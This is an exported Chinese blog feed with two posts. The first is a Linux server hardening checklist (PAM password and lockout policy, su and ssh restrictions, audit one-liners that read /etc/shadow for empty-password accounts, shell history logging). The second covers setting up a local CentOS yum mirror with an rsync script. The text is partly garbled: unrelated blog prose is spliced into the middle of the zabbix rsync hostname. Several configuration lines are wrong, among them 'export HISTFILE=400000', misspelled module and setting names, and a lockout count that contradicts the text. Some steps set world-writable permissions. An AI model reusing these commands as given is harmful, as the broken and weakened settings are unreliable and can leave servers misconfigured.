<h2 id="系统"><a href="#系统" class="headerlink" title="系统"></a>系统</h2><h3 id="打开aclfile支持"><a href="#打开aclfile支持" class="headerlink" title="打开aclfile支持"></a>打开aclfile支持</h3><p>安装acl 支持 yum -y install libacl acl</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vi &#x2F;etc&#x2F;fstab</span></pre></td></tr></table></figure>
<h3 id=""><a href="#" class="headerlink" title=""></a><img src="/2019/02/Linux_jagu_01/fstab.png" alt="fstab"></h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dumpe2fs &#x2F;dev&#x2F;sda1 |grep acl</span></pre></td></tr></table></figure>
<p><img src="/2019/02/Linux_jagu_01/dumpe2fs.png" alt="dumpe2fs"></p>
<h3 id="不推荐使用lvm分区格式（建议测试环境使用）"><a href="#不推荐使用lvm分区格式（建议测试环境使用）" class="headerlink" title="不推荐使用lvm分区格式（建议测试环境使用）"></a>不推荐使用lvm分区格式（建议测试环境使用）</h3><h3 id="设置系统自动注销"><a href="#设置系统自动注销" class="headerlink" title="设置系统自动注销"></a>设置系统自动注销</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vi &#x2F;etc&#x2F;profile </span></pre></td></tr><tr><td class="code"><pre><span class="line">export TMOUT&#x3D;600</span></pre></td></tr></table></figure>
<h3 id="精简开机（-按需定制）"><a href="#精简开机（-按需定制）" class="headerlink" title="精简开机（*按需定制）"></a>精简开机（*按需定制）</h3><p>acpid</p>
<p>apmd</p>
<p>kudzu</p>
<p>sshd</p>
<p>rsyslog</p>
<p>network</p>
<p>crond</p>
<p>sysstat</p>
<p>iostat</p>
<p>mpstat</p>
<p>sar</p>
<h3 id="开启iptables"><a href="#开启iptables" class="headerlink" title="开启iptables"></a>开启iptables</h3><h3 id="启用tcp-wrappers防火墙"><a href="#启用tcp-wrappers防火墙" class="headerlink" title="启用tcp_wrappers防火墙"></a>启用tcp_wrappers防火墙</h3><h3 id="减少不必要的用户"><a href="#减少不必要的用户" class="headerlink" title="减少不必要的用户"></a>减少不必要的用户</h3><p>可以删除的用户 adm lp sync shutdown halt news uucp operator games gopher</p>
<p>可以删除的用户组 adm lp news uucp games dip pppusers popusers slipusers</p>
<h3 id="为grub加密"><a href="#为grub加密" class="headerlink" title="为grub加密"></a>为grub加密</h3><h3 id="隐藏linux-版本信息"><a href="#隐藏linux-版本信息" class="headerlink" title="隐藏linux 版本信息"></a>隐藏linux 版本信息</h3><h3 id="锁定关键文件"><a href="#锁定关键文件" class="headerlink" title="锁定关键文件"></a>锁定关键文件</h3><h3 id="选择合适的yum源"><a href="#选择合适的yum源" class="headerlink" title="选择合适的yum源"></a>选择合适的yum源</h3><h3 id="调整linux-系统文件描述符数量"><a href="#调整linux-系统文件描述符数量" class="headerlink" title="调整linux 系统文件描述符数量"></a>调整linux 系统文件描述符数量</h3><p><strong>临时修改</strong></p>
<p><strong>ulimit -n 4096</strong></p>
<p>vim /etc/security/limits.conf</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">在这个文件的最后增加：</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">*  - nofile  4096</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">* - nofile  4096</span></pre></td></tr></table></figure>
<h3 id="Linux操作日志记录"><a href="#Linux操作日志记录" class="headerlink" title="Linux操作日志记录"></a>Linux操作日志记录</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">USER_IP&#x3D;&#96;who -u am i 2&gt; &#x2F;dev&#x2F;null | awk &#39;&#123; print $NF &#125;&#39; |sed -e &#39;s&#x2F;[()]&#x2F;&#x2F;g&#39;&#96;</span></pre></td></tr><tr><td class="code"><pre><span class="line">HISTDIR&#x3D;&#x2F;usr&#x2F;share&#x2F;.history</span></pre></td></tr><tr><td class="code"><pre><span class="line">if [ -z $USER_IP ]</span></pre></td></tr><tr><td class="code"><pre><span class="line">    then</span></pre></td></tr><tr><td class="code"><pre><span class="line">    USER_IP&#x3D;&#96;hostname&#96;</span></pre></td></tr><tr><td class="code"><pre><span class="line">fi</span></pre></td></tr><tr><td class="code"><pre><span class="line">if [ ! -d $HISTDIR ]</span></pre></td></tr><tr><td class="code"><pre><span class="line">    then</span></pre></td></tr><tr><td class="code"><pre><span class="line">    mkdir -p $HISTDIR</span></pre></td></tr><tr><td class="code"><pre><span class="line">    chmod 777 $HISTDIR</span></pre></td></tr><tr><td class="code"><pre><span class="line">fi</span></pre></td></tr><tr><td class="code"><pre><span class="line">if [ ! -d $HISTDIR&#x2F;$&#123;LOGNAME&#125; ]</span></pre></td></tr><tr><td class="code"><pre><span class="line">    then</span></pre></td></tr><tr><td class="code"><pre><span class="line">    mkdir -p $HISTDIR&#x2F;$&#123;LOGNAME&#125;</span></pre></td></tr><tr><td class="code"><pre><span class="line">    chmod 700 $HISTDIR&#x2F;$&#123;LOGNAME&#125;</span></pre></td></tr><tr><td class="code"><pre><span class="line">fi</span></pre></td></tr><tr><td class="code"><pre><span class="line">export HISTFILE&#x3D;400000</span></pre></td></tr><tr><td class="code"><pre><span class="line">DT&#x3D;&#96;date +%Y%m%d&#96;</span></pre></td></tr><tr><td class="code"><pre><span class="line">export HISTFILE&#x3D;&quot;$HISTDIR&#x2F;$&#123;LOGNAME&#125;&#x2F;$&#123;USER_IP&#125;.history.$DT&quot;</span></pre></td></tr><tr><td class="code"><pre><span class="line">export HISTTIMEFORMAT&#x3D;&quot;[%Y.%m.%d %H:%M:%S]&quot;</span></pre></td></tr><tr><td class="code"><pre><span class="line">chmod 777 $HISTDIR&#x2F;$&#123;LOGNAME&#125;&#x2F;*.history* 2&gt; &#x2F;dev&#x2F;null</span></pre></td></tr><tr><td class="code"><pre><span class="line">chattr +a  $HISTDIR&#x2F;$&#123;LOGNAME&#125;&#x2F;*.history* 2&gt; &#x2F;dev&#x2F;null</span></pre></td></tr></table></figure>
<p>更改权限chmod 1777 /usr/share/.history</p>
<h3 id="禁止root远程登录更改常用端口"><a href="#禁止root远程登录更改常用端口" class="headerlink" title="禁止root远程登录更改常用端口"></a>禁止root远程登录更改常用端口</h3><h3 id="Selinux-调整"><a href="#Selinux-调整" class="headerlink" title="Selinux 调整"></a>Selinux 调整</h3><h3 id="内核参数优化"><a href="#内核参数优化" class="headerlink" title="内核参数优化"></a>内核参数优化</h3><h3 id="tmp-var-tmp-dev-shm目录没有执行权限"><a href="#tmp-var-tmp-dev-shm目录没有执行权限" class="headerlink" title="/tmp /var/tmp /dev/shm目录没有执行权限"></a>/tmp /var/tmp /dev/shm目录没有执行权限</h3><h1 id="用户管理"><a href="#用户管理" class="headerlink" title="用户管理"></a>用户管理</h1><h3 id="用户账户"><a href="#用户账户" class="headerlink" title="用户账户"></a>用户账户</h3><h4 id="pwck-passwd-check"><a href="#pwck-passwd-check" class="headerlink" title="pwck   (passwd check)"></a>pwck   (passwd check)</h4><p>1.功能</p>
<p>检测/etc/passwd   的语法与文件及存在的用户</p>
<p><img src="/2019/02/Linux_jagu_01/checkpasswd.png" alt="checkpasswd"></p>
<h4 id="grpck-group-check"><a href="#grpck-group-check" class="headerlink" title="grpck   (group check)"></a>grpck   (group check)</h4><p>功能</p>
<p>检测/etc/group   的语法与文件形式及存在的用户组。<img src="/2019/02/Linux_jagu_01/grpck.png" alt="grpck"></p>
<h4 id="chage"><a href="#chage" class="headerlink" title="chage"></a>chage</h4><p>功能查看密码用户过期时间</p>
<p>​       chage   -l   user</p>
<p><img src="/2019/02/Linux_jagu_01/chage.png" alt="chage"></p>
<p>修改<br>user用户的密码期限：</p>
<p><img src="/2019/02/Linux_jagu_01/chage-1.png" alt="chage-1"></p>
<p><img src="/2019/02/Linux_jagu_01/chage-02.png" alt="chage-02"></p>
<p>上面的命令将密码期限设为2016年10月30日。另外，修改密码的最短周期为5天，最长周期为90天。密码过期前14天会发送消息提醒用户，过期后帐号会被锁住30天。</p>
<h4 id="2-1-4查看空密码用户"><a href="#2-1-4查看空密码用户" class="headerlink" title="2.1.4查看空密码用户"></a>2.1.4查看空密码用户</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">awk -F : &#39;$2&#x3D;&#x3D;&quot;&quot; &#123;print $1&#125;&#39; &#x2F;etc&#x2F;shadow</span></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">awk -F: &#39;length($2)&#x3D;&#x3D;2 &#123;print $1&#125;&#39; &#x2F;etc&#x2F;shadow</span></pre></td></tr></table></figure>
<p>在centos等系统下，密码如果为空，会用两个！！表示，因此其长度为2，而正常的用户且密码不为空的，是采用加密存储的，其长度远大于2。</p>
<p><img src="/2019/02/Linux_jagu_01/nullpasswduser.png" alt="nullpasswduser"></p>
<p>空密码用户建立过程</p>
<p>首先创建两个用户,   目的是为了比对</p>
<p>useradd   user</p>
<p>useradd   user1</p>
<p>然后root用户用passwd   –d   user   (清除use1的密码)</p>
<h4 id="查找uid为0的用户"><a href="#查找uid为0的用户" class="headerlink" title="查找uid为0的用户"></a>查找uid为0的用户</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">awk -F: &#39;$3&#x3D;&#x3D;0 &#123;print $1&#125;&#39; &#x2F;etc&#x2F;passwd</span></pre></td></tr></table></figure>
<h3 id="用户账户策略"><a href="#用户账户策略" class="headerlink" title="用户账户策略"></a>用户账户策略</h3><h4 id="2-2-1-设置账户过期时间"><a href="#2-2-1-设置账户过期时间" class="headerlink" title="2.2.1   设置账户过期时间"></a>2.2.1   设置账户过期时间</h4><p>usermod   -e   MM/DD/YY   username</p>
<p>usermod   -e   12/31/01   floatboat</p>
<h4 id="2-2-2-密码安全策略"><a href="#2-2-2-密码安全策略" class="headerlink" title="2.2.2   密码安全策略"></a>2.2.2   密码安全策略</h4><p>需要安装(yum   install   cracklib-devel)(   sudo   apt-get   install   libpam-cracklib)</p>
<p><a href="https://linux.cn/article-2518-1.html" target="_blank" rel="noopener">https://linux.cn/article-2518-1.html</a></p>
<h4 id="⑴-禁止使用旧密码"><a href="#⑴-禁止使用旧密码" class="headerlink" title="⑴   禁止使用旧密码"></a>⑴   禁止使用旧密码</h4><p><img src="/2019/02/Linux_jagu_01/sys-auth.png" alt="sys-auth"></p>
<p><img src="/2019/02/Linux_jagu_01/sys-auth-01.png" alt="sys-auth-01"></p>
<p>已经使用过的密码保存到/etc/security/opasswd下</p>
<h4 id="⑵设置密码的最小长度"><a href="#⑵设置密码的最小长度" class="headerlink" title="⑵设置密码的最小长度"></a>⑵设置密码的最小长度</h4><p>sudo   vi   /etc/pam.d/system-auth  </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">password   sufficient   pamunix.so   sha512   shadow   nullok   tryfirstpass   useauthtok   remember&#x3D;   5   minlen&#x3D;最小长度</span></pre></td></tr></table></figure>
<p>第二种方法</p>
<p>vi   /etc/login.defs</p>
<p>vi   /etc/login.defs   把   PASS_MIN_LNE   5</p>
<p>改为：   PASS_MIN_LEN   想要的位数   [3]密码生存周期限制   vi   /etc/login.defs   PASS_MAX_DAYS=想要的天数   [4]口令过期提醒：   vi   /etc/login.defs   加入：   PASS_WARN_AGE=天数</p>
<p>登录超时</p>
<p>编辑   /etc/profile   指令：sudo   vi   /etc/profile   在histsize=1000   下面加一行   TMOUT=100（单位为秒）</p>
<h4 id="㈢使用pam禁止用户su为root"><a href="#㈢使用pam禁止用户su为root" class="headerlink" title="㈢使用pam禁止用户su为root"></a>㈢使用pam禁止用户su为root</h4><p>vi   /etc/pam.d/su   打开这个配置文件   #auth   required   /lib/security/$ISA/pam_wheel.so   use_uid   ←找到此行，去掉行首的“#”   然后普通用户就无法通过su   得到root权限了</p>
<p><img src="/2019/02/Linux_jagu_01/stopsu.png" alt="stopsu"></p>
<p>将在root用户下用指令   usermod<br>-G   wheel   user普通用户加入到wheel之后才能用su   -提升到   root</p>
<p><img src="/2019/02/Linux_jagu_01/denysu.png" alt="denysu"></p>
<h4 id="sudo-限制权限"><a href="#sudo-限制权限" class="headerlink" title="sudo   限制权限"></a>sudo   限制权限</h4><p><strong>禁止某些用户使用**</strong>ssh<strong>**远程登录</strong>：<br> <a href="http://www.myhack58.com/Article/48/66/2011/30887.htm" target="_blank" rel="noopener">http://www.myhack58.com/Article/48/66/2011/30887.htm</a><br> vim /etc/pam.d/sshd</p>
<p>  在第一行加入 auth       required     pam_listfile.so item=user sense=deny file=/etc/sshdusers onerr=succeed，注意一定要在第一行，因为pam中执行顺序是上面优先</p>
<p>vim /etc/sshdusers</p>
<p>在文件中加入root    wp ，root 和wp是两个本地用户</p>
<p>service sshd restart</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cat &#x2F;etc&#x2F;passwd | awk -F &#39;:&#39; &#39;&#123;print $1&#125;&#39; &gt; &#x2F;etc&#x2F;sshdusers</span></pre></td></tr><tr><td class="code"><pre><span class="line">去掉你想要的</span></pre></td></tr></table></figure>
<p>如果只允许登录</p>
<p>auth required pam_listfile.so item=user sense=allow file=/etc/sshdusers onerr=fail</p>
<p>这个只允许某个登录</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo &#39;user-admin&#39; &gt; &#x2F;etc&#x2F;sshdusers</span></pre></td></tr><tr><td class="code"><pre><span class="line">chattr +i &#x2F;etc&#x2F;sshdusers</span></pre></td></tr></table></figure>
<h4 id="限制root用户-ssh远程更改ssh端口"><a href="#限制root用户-ssh远程更改ssh端口" class="headerlink" title="限制root用户,ssh远程更改ssh端口"></a>限制root用户,ssh远程更改ssh端口</h4><p>vi /etc/ssh/sshd_config</p>
<p><img src="/2019/02/Linux_jagu_01/changeport.png" alt="changeport"></p>
<p><img src="/2019/02/Linux_jagu_01/denyroot.png" alt="denyroot"></p>
<p>StrictModes yes #修改为yes,默认为yes.如果不修改用key登陆是出现server refused our key(如果StrictModes为yes必需保证存放公钥的文件夹的拥有与登陆用户名是相同的.“StrictModes”设置ssh在接收登录请求之前是否检查用户家目录和rhosts文件的权限和所有权。这通常是必要的，因为新手经常会把自己的目录和文件设成任何人都有写权限。) </p>
<p><img src="/2019/02/Linux_jagu_01/dontallownullpass.png" alt="dontallownullpass"></p>
<p>修改登录失败策略</p>
<p><img src="/2019/02/Linux_jagu_01/trymax.png" alt="trymax"></p>
<p><img src="/2019/02/Linux_jagu_01/nulltime.png" alt="nulltime"></p>
<p>以上表示10分钟闲置后，自动注销并结束会话。</p>
<p>检测方法    1、判定条件<br>查看帐号超时是否自动注销；</p>
<p>登录尝试5次失败锁定半小时</p>
<p>vim /etc/pam.d/login #本地锁定</p>
<p>auth   required pam_tally2.so    deny=3 unlock_time=300 even_deny_root root_unlock_time=30</p>
<p><img src="/2019/02/Linux_jagu_01/stopfive.png" alt="stopfive"></p>
<p>Vim /etc/pam.d/sshd  #远程登录锁定</p>
<p>auth   required pam_tally2.so    deny=3 unlock_time=300 even_deny_root root_unlock_time=30</p>
<p><img src="/2019/02/Linux_jagu_01/pamsshd.png" alt="pamsshd"></p>
<p>查看用户登录失败次数：</p>
<p>pam_tally2 –user root</p>
<p>解除锁定：</p>
<p>pam_tally2 -r -u root</p>
<h4 id="RSA认证"><a href="#RSA认证" class="headerlink" title="RSA认证"></a>RSA认证</h4><p>RSAAuthentication yes        # 启用 RSA 认证（默认是注释掉的，将注释去掉，如果不是yes，改为yes）<br> PubkeyAuthentication yes     # 启用公钥认证（默认是注释掉的，将注释去掉，如果不是yes，改为yes）<br> PasswordAuthentication yes # 密码认证(改为yes默认为yes是用密码认证)</p>
<p>生成认证证书</p>
<p><img src="/2019/02/Linux_jagu_01/identified.png" alt="identified"></p>
<p>将生成的公钥匙id_rsa.pub传到要登陆的服务器上并追加到authorized_keys文件中，放到用户目录的.ssh中 cat id_rsa.pub &gt;&gt; .ssh/authorized_keys (如果没有authorized_keys，可直接将id_rsa.pub重命名为authorized_keys</p>
<p>保证.ssh 权限是600</p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux localmirrors</title>
    <url>/2017/07/Linux-localmirrors/</url>
    <content><![CDATA[<h1 id="Centos基于ISO镜像搭建本地源-HTTP源"><a href="#Centos基于ISO镜像搭建本地源-HTTP源" class="headerlink" title="Centos基于ISO镜像搭建本地源/HTTP源"></a>Centos基于ISO镜像搭建本地源/HTTP源</h1><p>Yum server源</p>
<p>YUM源我知道的有如下几类</p>
<p><strong>Base</strong>:相当于下载光盘里的DVD1</p>
<p><strong>Extra</strong>:相当于下载光盘里的DVD2</p>
<p><strong>Epel</strong>:Epel官方获取的源</p>
<p><strong>elrepo</strong>: 我更新CentOS内核使用的</p>
<p>Yum源对应目录里一家有两个重要的目录Packages和repodata,其中Packages上存放的是yum安装的rpm包。repodata中包含一些.xml的文件，它是yum索引文件，包含rpm包的信息，依赖关系等，yum的自动安装依赖于此配置文件。repomd.xml   #这个文件为MD5校验信息。</p>
<p>repodata 目录下都有filelist ,primary ,other,  记录软件包文件列表。 </p>
<p>那么不管采用何种方式配置的YUM源，都会有Packages目录和包含.xml文件的repodata目录。无论搭建什么样的服务器（web,ftp,nfs,samba)只要共享的目录对应的是可用yum源即可</p>
<p><strong>注意</strong> <strong>在windows下解压镜像发现repodata中的后缀总是缺失</strong>。在Linux下挂载倒是没问题</p>
<h2 id="1-使用本地光盘搭建"><a href="#1-使用本地光盘搭建" class="headerlink" title="1 使用本地光盘搭建"></a>1 使用本地光盘搭建</h2><p><strong>首先挂载镜像</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@bogon ~]# mkdir /mnt/repo</span></pre></td></tr><tr><td class="code"><pre><span class="line">[root@bogon ~]# mount /dev/cdrom /mnt/repo/</span></pre></td></tr></table></figure>
<p>增加配置文件<code>/etc/yum.repos.d/local.repo</code><br><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[RHEL-LOCAL] #源的名称自己定义</span></pre></td></tr><tr><td class="code"><pre><span class="line">name=rhel54 #源的名字，自己定义</span></pre></td></tr><tr><td class="code"><pre><span class="line">baseurl=file:///mnt/repo #源的路径支持http、file、https、ftp等</span></pre></td></tr><tr><td class="code"><pre><span class="line">gpgcheck=1 #是否进行gpg文件检查。建议开启</span></pre></td></tr><tr><td class="code"><pre><span class="line">enabled=1 #是否启用</span></pre></td></tr><tr><td class="code"><pre><span class="line">gpgkey=file:///mnt/repo/RPM-GPG-KEY-CentOS-7 #指定gpg文件</span></pre></td></tr><tr><td class="code"><pre><span class="line">priority=1 #设置优先级</span></pre></td></tr></table></figure></p>
<p>注释掉无关源。更新缓存</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">yum clean all</span></pre></td></tr><tr><td class="code"><pre><span class="line">yum makecache</span></pre></td></tr></table></figure>
<h2 id="2-使用HTTP搭建"><a href="#2-使用HTTP搭建" class="headerlink" title="2 使用HTTP搭建"></a>2 使用HTTP搭建</h2><p>我这里为了方便直接就使用了python的SimpleHTTPServer模块</p>
<p>文件可以挂载镜像然后复制到指定目录即可</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@bogon ~]# python -m SimpleHTTPServer</span></pre></td></tr><tr><td class="code"><pre><span class="line">Serving HTTP on 0.0.0.0 port 8000 ...</span></pre></td></tr></table></figure>
<p>增加配置文件<code>/etc/yum.repos.d/local.repo</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[centos-local]</span></pre></td></tr><tr><td class="code"><pre><span class="line">name&#x3D;centos-local</span></pre></td></tr><tr><td class="code"><pre><span class="line">baseurl&#x3D;http:&#x2F;&#x2F;9.9.9.66:8000&#x2F;</span></pre></td></tr><tr><td class="code"><pre><span class="line">gpgcheck&#x3D;1</span></pre></td></tr><tr><td class="code"><pre><span class="line">gpgkey&#x3D;http:&#x2F;&#x2F;9.9.9.66:8000&#x2F;RPM-GPG-KEY-CentOS-7</span></pre></td></tr><tr><td class="code"><pre><span class="line">enable&#x3D;1</span></pre></td></tr></table></figure>
<p>注释掉无关源。并且执行以下操作</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@bogon repo]# yum clean all</span></pre></td></tr><tr><td class="code"><pre><span class="line">Loaded plugins: fastestmirror</span></pre></td></tr><tr><td class="code"><pre><span class="line">Cleaning repos: centos-local</span></pre></td></tr><tr><td class="code"><pre><span class="line">Cleaning up everything</span></pre></td></tr><tr><td class="code"><pre><span class="line">Cleaning up list of fastest mirrors</span></pre></td></tr><tr><td class="code"><pre><span class="line">[root@bogon repo]# yum makecache</span></pre></td></tr><tr><td class="code"><pre><span class="line">Loaded plugins: fastestmirror</span></pre></td></tr><tr><td class="code"><pre><span class="line">centos-local                                                                                 | 3.6 kB  00:00:00</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">(1/4): centos-local/group_gz                                                                 | 155 kB  00:00:00</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">(2/4): centos-local/filelists_db                                                             | 3.0 MB  00:00:00</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">(3/4): centos-local/primary_db                                                               | 3.0 MB  00:00:00</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">(4/4): centos-local/other_db</span></pre></td></tr></table></figure>
<h2 id="3-使用同步更新源"><a href="#3-使用同步更新源" class="headerlink" title="3 使用同步更新源"></a>3 使用同步更新源</h2><p>我这里使用的是中科大和清华的同步源，大致大小为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">16G	ambari</span></pre></td></tr><tr><td class="code"><pre><span class="line">87G	archlinux</span></pre></td></tr><tr><td class="code"><pre><span class="line">61G	archlinuxcn</span></pre></td></tr><tr><td class="code"><pre><span class="line">73G	centos</span></pre></td></tr><tr><td class="code"><pre><span class="line">41K	config</span></pre></td></tr><tr><td class="code"><pre><span class="line">45G	elrepo</span></pre></td></tr><tr><td class="code"><pre><span class="line">49G	epel</span></pre></td></tr><tr><td class="code"><pre><span class="line">512	exclude.list</span></pre></td></tr><tr><td class="code"><pre><span class="line">512	exgentoo.list</span></pre></td></tr><tr><td class="code"><pre><span class="line">261G	gentoo</span></pre></td></tr><tr><td class="code"><pre><span class="line">14G	lfs</span></pre></td></tr><tr><td class="code"><pre><span class="line">91M	LFS-doc</span></pre></td></tr><tr><td class="code"><pre><span class="line">6.4G	LFS-LiveCD</span></pre></td></tr><tr><td class="code"><pre><span class="line">1.5G	openvas</span></pre></td></tr><tr><td class="code"><pre><span class="line">14G	zabbix</span></pre></td></tr></table></figure>
<p>贴出来同步脚本</p>
<p><code>localmirror.sh</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!&#x2F;bin&#x2F;bash</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">mkdir -p CentosRepo</span></pre></td></tr><tr><td class="code"><pre><span class="line">#epel</span></pre></td></tr><tr><td class="code"><pre><span class="line">rsync -Ravz --exclude-from&#x3D;.&#x2F;exclude.list rsync:&#x2F;&#x2F;mirrors.tuna.tsinghua.edu.cn&#x2F;epel&#x2F;  &#96;pwd&#96;&#x2F;CentosRepo&#x2F;epel&#x2F;</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">#centos \</span></pre></td></tr><tr><td class="code"><pre><span class="line">rsync -aRvz --exclude-from&#x3D;.&#x2F;exclude.list rsync:&#x2F;&#x2F;mirrors.tuna.tsinghua.edu.cn&#x2F;centos&#x2F; &#96;pwd&#96;&#x2F;CentosRepo&#x2F;centos</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">#archlinux</span></pre></td></tr><tr><td class="code"><pre><span class="line">rsync -aRvz  rsync:&#x2F;&#x2F;mirrors.tuna.tsinghua.edu.cn&#x2F;archlinux&#x2F;   &#96;pwd&#96;&#x2F;CentosRepo&#x2F;archlinux</span></pre></td></tr><tr><td class="code"><pre><span class="line">rsync -aRvz  rsync:&#x2F;&#x2F;mirrors.tuna.tsinghua.edu.cn&#x2F;archlinuxcn&#x2F; &#96;pwd&#96;&#x2F;CentosRepo&#x2F;archlinuxcn</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">#lfs</span></pre></td></tr><tr><td class="code"><pre><span class="line">rsync -aRvz  rsync:&#x2F;&#x2F;mirrors.ustc.edu.cn&#x2F;lfs&#x2F;  &#96;pwd&#96;&#x2F;CentosRepo&#x2F;lfs</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">#gentoo</span></pre></td></tr><tr><td class="code"><pre><span class="line">rsync -aRvz --exclude-from&#x3D;.&#x2F;exgentoo.list rsync:&#x2F;&#x2F;mirrors.ustc.edu.cn&#x2F;gentoo&#x2F; &#96;pwd&#96;&#x2F;CentosRepo&#x2F;gentoo&#x2F;</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">#centos kernel update</span></pre></td></tr><tr><td class="code"><pre><span class="line">rsync -aRvz rsync:&#x2F;&#x2F;mirrors.tuna.tsinghua.edu.cn&#x2F;elrepo&#x2F; &#96;pwd&#96;&#x2F;CentosRepo&#x2F;elrepo</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">#zabbix</span></pre></td></tr><tr><td class="code"><pre><span class="line">rsync -aRvz rsync:&#x2F;&#x2F;mirrors.tun了一个独立博客，想到了这个方法，使用之后真的特别简洁。为了更直观地说明，奉上使用这种方法不同时候的流a.tsinghua.edu.cn&#x2F;zabbix&#x2F; &#96;pwd&#96;&#x2F;CentosRepo&#x2F;zabbix</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">#openvas</span></pre></td></tr><tr><td class="code"><pre><span class="line">rsync -aRvz  rsync:&#x2F;&#x2F;feed.openvas.org:&#x2F;scap-data  &#96;pwd&#96;&#x2F;CentosRepo&#x2F;openvas&#x2F;scap-data</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">rsync -aRvz  rsync:&#x2F;&#x2F;feed.openvas.org:&#x2F;cert-data &#96;pwd&#96;&#x2F;CentosRepo&#x2F;openvas&#x2F;cert-data</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">rsync -aRvz  rsync:&#x2F;&#x2F;feed.openvas.org:&#x2F;nvt-feed  &#96;pwd&#96;&#x2F;CentosRepo&#x2F;openvas&#x2F;nvt-feed</span></pre></td></tr></table></figure>
<p><code>exgentoo.list</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">alpha</span></pre></td></tr><tr><td class="code"><pre><span class="line">arm</span></pre></td></tr><tr><td class="code"><pre><span class="line">arm64</span></pre></td></tr><tr><td class="code"><pre><span class="line">bsd</span></pre></td></tr><tr><td class="code"><pre><span class="line">hppa</span></pre></td></tr><tr><td class="code"><pre><span class="line">ia64</span></pre></td></tr><tr><td class="code"><pre><span class="line">m68k</span></pre></td></tr><tr><td class="code"><pre><span class="line">mips</span></pre></td></tr><tr><td class="code"><pre><span class="line">ppc</span></pre></td></tr><tr><td class="code"><pre><span class="line">prefix</span></pre></td></tr><tr><td class="code"><pre><span class="line">s390</span></pre></td></tr><tr><td class="code"><pre><span class="line">sh</span></pre></td></tr><tr><td class="code"><pre><span class="line">sparc</span></pre></td></tr><tr><td class="code"><pre><span class="line">snapshots</span></pre></td></tr><tr><td class="code"><pre><span class="line">10.1</span></pre></td></tr><tr><td class="code"><pre><span class="line">11.0</span></pre></td></tr><tr><td class="code"><pre><span class="line">11.2</span></pre></td></tr><tr><td class="code"><pre><span class="line">12.0</span></pre></td></tr><tr><td class="code"><pre><span class="line">12.1</span></pre></td></tr><tr><td class="code"><pre><span class="line">20121221</span></pre></td></tr><tr><td class="code"><pre><span class="line">20140826</span></pre></td></tr><tr><td class="code"><pre><span class="line">20160514</span></pre></td></tr><tr><td class="code"><pre><span class="line">20160704</span></pre></td></tr><tr><td class="code"><pre><span class="line">autobuilds</span></pre></td></tr></table></figure>
<p><code>exclude.list</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SRPMS</span></pre></td></tr><tr><td class="code"><pre><span class="line">aarch64</span></pre></td></tr><tr><td class="code"><pre><span class="line">ppc64</span></pre></td></tr><tr><td class="code"><pre><span class="line">ppc64le</span></pre></td></tr><tr><td class="code"><pre><span class="line">isos</span></pre></td></tr><tr><td class="code"><pre><span class="line">drpms</span></pre></td></tr><tr><td class="code"><pre><span class="line">debug</span></pre></td></tr><tr><td class="code"><pre><span class="line">atomic</span></pre></td></tr><tr><td class="code"><pre><span class="line">cloud</span></pre></td></tr><tr><td class="code"><pre><span class="line">virt</span></pre></td></tr><tr><td class="code"><pre><span class="line">storage</span></pre></td></tr><tr><td class="code"><pre><span class="line">sclo</span></pre></td></tr><tr><td class="code"><pre><span class="line">testing</span></pre></td></tr><tr><td class="code"><pre><span class="line">paas</span></pre></td></tr></table></figure>
<p>可以写成定时计划这样每天定期更新</p>
